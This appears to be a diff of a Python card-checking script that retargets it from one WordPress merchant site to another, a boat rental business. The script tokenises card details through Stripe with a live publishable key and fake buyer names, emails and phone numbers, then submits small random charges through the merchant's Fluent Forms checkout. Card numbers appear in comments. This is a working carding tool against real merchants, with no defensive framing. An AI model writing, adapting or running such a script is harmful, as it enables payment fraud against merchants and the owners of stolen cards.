@@ -58,6 +58,7 @@ def Tele(ccx):
     username = generate_username()
     corr = generate_random_code()
     sess = generate_random_code()
+    ph = random.randint(1111, 9999)
     nr = random.randint(50, 99)
     lr = random.randint(0, 1)
     amount = f'{lr}.{nr}'
@@ -80,55 +81,51 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F4dae3e22af%3B+stripe-js-v3%2F4dae3e22af%3B+card-element&referrer=https%3A%2F%2Fwww.aimovieawards.org&time_on_page=129615&key=pk_live_51SRs8FPeisNgKGtQGZZKGzlrMefQcH3GyTEVw4E5CB9r0qg4pBQTuagBcRK25cfrp7s8G182eyBJ0ZoJSqQSrfs800aWBepVyw'
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F09b245ec49%3B+stripe-js-v3%2F09b245ec49%3B+card-element&key=pk_live_51TPK3NLocw8mjHaGQUGKCUkP77cBTXwhJTtuW4BXNxznbdf7gn01gs5JcY4u7utPSorQL3bVdLKM5zaL82FkGHWa005RcYiEyD'
     
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
     
     pm = response.json()['id']
     
     cookies = {
-        '_ga': 'GA1.1.1062979907.1786456842',
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-08-11%2014%3A00%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.aimovieawards.org%2Fsubmit%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-        'sbjs_first_add': 'fd%3D2026-08-11%2014%3A00%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.aimovieawards.org%2Fsubmit%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.aimovieawards.org%2Fsubmit%2F',
-        'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
-        'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
-        'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
-        'tk_ai': '5Y/Czywuemc/+S9bcXJ9lG66',
-        '__stripe_mid': 'c0817b3f-1f63-4816-817a-061438971687c09486',
-        '__stripe_sid': '16d7f413-2d12-4333-8151-2e789669bc80770c83',
-        '_ga_B86Y06F6FJ': 'GS2.1.s1786456841$o1$g1$t1786456972$j20$l0$h0',
+        '_ga': 'GA1.1.1663506731.1786583066',
+        'wp-wpml_current_language': 'en',
+        '__stripe_mid': 'caedc098-9d91-49d1-ae4e-33e91cec2dbf62ccf2',
+        '__stripe_sid': '42a2bb83-285d-4023-8c17-40414f496a2544415d',
+        'cookies_consent': '1',
+        '_ga_TN77QFXSGJ': 'GS2.1.s1786583065$o1$g1$t1786583170$j37$l0$h66948570',
+        '_gcl_au': '1.1.956364726.1786583066.158126338.1786583148.1786583170.370899397.1786583148.1786583170',
     }
     
     headers = {
-        'authority': 'www.aimovieawards.org',
-        'accept': '*/*',
-        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://www.aimovieawards.org',
-        'referer': 'https://www.aimovieawards.org/submit/',
+        'Accept': '*/*',
+        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Origin': 'https://www.sandseaboatrentals.com',
+        'Referer': 'https://www.sandseaboatrentals.com/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'X-Requested-With': 'XMLHttpRequest',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
     }
     
     params = {
-        't': '1786456973537',
+        't': '1786583171258',
     }
     
-    data = f'data=ak_hp_textarea%3D%26ak_js%3D1786456841173%26__fluent_form_embded_post_id%3D7032%26_fluentform_4_fluentformnonce%3Dbf83c3dcbe%26_wp_http_referer%3D%252Fsubmit%252F%26names%255Bfirst_name%255D%3D{first_name}%26names%255Blast_name%255D%3D{last_name}%26email%3D{email}%26country-list%3DTH%26input_text%3DMPT%26url%3Dhttps%253A%252F%252Fmpt.com.mm%252Fimages%26checkbox%255B%255D%3DArt%2520%257C%2520Image%2520(20%25E2%2582%25AC)%26custom-payment-amount%3D{amount}%26payment-coupon%3D%26payment_method%3Dstripe%26__ff_all_applied_coupons%3D%26image-upload%255B%255D%3Dhttps%253A%252F%252Fwww.aimovieawards.org%252Fwp-content%252Fuploads%252Ffluentform%252Ftemp%252FzGdjXFdBPYcWYulwA7idUT66t9F7YOAaVpCNV1tDOycvkPiteDr5pC7PZN6nRmVyvIPfTrmM186XF5oPD9o5PjeE81%252FDZey8mLuC0vgLHGy6xghnRfvWjZfXvzrLgEKqxF6Lt4X1CePYuuLPBxeUFQ%253D%253D%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=4'
+    data = {
+        'data': f'__fluent_form_embded_post_id=93&_fluentform_1_fluentformnonce=d91b37132a&_wp_http_referer=%2F&datetime=31-08-2026&dropdown_1=2%20hours&dropdown=1&numeric_field=90&custom-payment-amount={amount}&names%5Bfirst_name%5D={first_name}&names%5Blast_name%5D={last_name}&email={email}&phone=%2B6681748{ph}&payment_method=stripe&checkbox%5B%5D=&__stripe_payment_method_id={pm}',
+        'action': 'fluentform_submit',
+        'form_id': '1',
+    }
     
     response = requests.post(
-        'https://www.aimovieawards.org/wp-admin/admin-ajax.php',
+        'https://www.sandseaboatrentals.com/wp-admin/admin-ajax.php',
         params=params,
         cookies=cookies,
         headers=headers,
@@ -136,5 +133,5 @@ def Tele(ccx):
     )
     return response.text
     
-#test_card = "4483860050445076|11|26|905"
+#test_card = "4346720000256782|11|30|933"
 #print(Tele(test_card))
